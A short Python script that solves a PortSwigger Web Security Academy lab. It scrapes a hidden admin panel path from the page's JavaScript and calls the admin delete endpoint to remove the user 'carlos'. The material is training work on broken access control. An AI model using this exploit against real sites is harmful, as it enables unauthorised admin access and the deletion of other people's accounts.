import requests
import argparse
import re

parser = argparse.ArgumentParser(description='Solves the following Lab: Unprotected admin functionality with unpredictable URL')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

index = requests.get("https://" + lab.id + ".web-security-academy.net/")
headers = {'Cookie':f'session={index.cookies.get("session")}'}
admin_panel = re.search(r"adminPanelTag\.setAttribute\('href', '(\/admin-\w+)'", index.text).group(1)
requests.get("https://" + lab.id + f".web-security-academy.net{admin_panel}/delete?username=carlos", headers=headers)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")